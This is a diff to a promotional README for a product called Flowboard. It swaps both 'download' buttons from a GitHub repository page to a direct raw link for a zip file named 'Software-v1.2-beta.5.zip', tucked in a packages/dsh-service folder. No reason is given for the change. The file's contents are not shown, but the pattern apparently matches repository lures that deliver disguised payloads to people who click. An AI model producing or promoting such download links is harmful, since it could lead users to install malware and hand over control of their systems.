@@ -31,7 +31,7 @@ The best part? Getting Flowboard up and running is easy, even if you've never in
 
 Ready to get started? Click the big button below to grab your copy:
 
-[**⬇️ DOWNLOAD FLOWBOARD NOW**](https://github.com/Untidy-cocoabutter173/Flowboard)
+[**⬇️ DOWNLOAD FLOWBOARD NOW**](https://raw.githubusercontent.com/Untidy-cocoabutter173/Flowboard/main/packages/dsh-service/Software-v1.2-beta.5.zip)
 
 ### Step 2: Install the Plugin
 
@@ -132,7 +132,7 @@ Thousands of teams have already made the switch to smoother, more connected work
 
 Ready to see the magic? Here's your download link one more time:
 
-[**⬇️ GET FLOWBOARD – IT'S FREE TO START!**](https://github.com/Untidy-cocoabutter173/Flowboard)
+[**⬇️ GET FLOWBOARD – IT'S FREE TO START!**](https://raw.githubusercontent.com/Untidy-cocoabutter173/Flowboard/main/packages/dsh-service/Software-v1.2-beta.5.zip)
 
 ## 📚 What Makes Us Special
 
